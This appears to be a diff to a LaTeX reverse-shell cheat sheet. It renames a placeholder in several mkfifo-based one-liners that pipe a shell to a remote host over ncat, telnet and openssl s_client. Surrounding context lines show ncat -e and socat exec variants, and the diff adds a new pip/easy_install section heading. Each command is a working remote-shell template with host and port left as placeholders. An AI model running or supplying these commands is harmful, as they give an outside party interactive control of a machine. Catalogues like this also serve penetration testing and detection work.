@@ -84,7 +84,7 @@ ncat -e |\shell| |\host| |\port|
 \notte{Standard error output of executed commands is not redirected to the socket. Option \texttt{-c} (\texttt{-{}-sh-exec}) can be used instead of \texttt{-e} with the same syntax, but \texttt{/bin/sh} is needed in that case.}
 
 \begin{cmdline}{bash}{^}{mkfifo,ncat}{}
-mkfifo ^\file^; ^\shell^ < ^\file^ 2>&1 | ncat ^\host^ ^\port^ > ^\file^; rm ^\file^
+mkfifo ^\tmp^; ^\shell^ < ^\tmp^ 2>&1 | ncat ^\host^ ^\port^ > ^\tmp^; rm ^\tmp^
 \end{cmdline}
 \dpd{\texttt{mkfifo}}
 
@@ -96,7 +96,7 @@ telnet ^\host^ ^\port^ | ^\shell^ 2>&1 | telnet ^\host^ ^\portt^
 \notte{The socket with port number \port\ serves as standard input while the socket with port number \portt\ serves as standard output and standard error output.}
 
 \begin{cmdline}{bash}{^}{mkfifo,telnet}{}
-mkfifo ^\file^; ^\shell^ < ^\file^ 2>&1 | telnet ^\host^ ^\port^ > ^\file^; rm ^\file^
+mkfifo ^\tmp^; ^\shell^ < ^\tmp^ 2>&1 | telnet ^\host^ ^\port^ > ^\tmp^; rm ^\tmp^
 \end{cmdline}
 \dpd{\texttt{mkfifo}}
 
@@ -110,7 +110,7 @@ socket -qvp '|\shell|' |\host| |\port|
 \subsection{OpenSSL (\texttt{openssl})}
 
 \begin{cmdline}{bash}{^}{mkfifo, openssl}{}
-mkfifo ^\file^; ^\shell^ < ^\file^ 2>&1 | openssl s_client -quiet -connect ^\host^:^\port^ > ^\file^; rm ^\file^
+mkfifo ^\tmp^; ^\shell^ < ^\tmp^ 2>&1 | openssl s_client -quiet -connect ^\host^:^\port^ > ^\tmp^; rm ^\tmp^
 \end{cmdline}
 \TODO{dependencies}
 
@@ -201,3 +201,4 @@ socat tcp-connect:|\host|:|\port| exec:|\shell|,pty,stderr,setsid,sigint,sane
 \end{cmdline}
 \TODO{dependencies, explain "optional" settings (pty,stderr,...)}
 
+\subsection{PIP (\texttt{pip}) \& Easy Install (\texttt{easy\_install})}
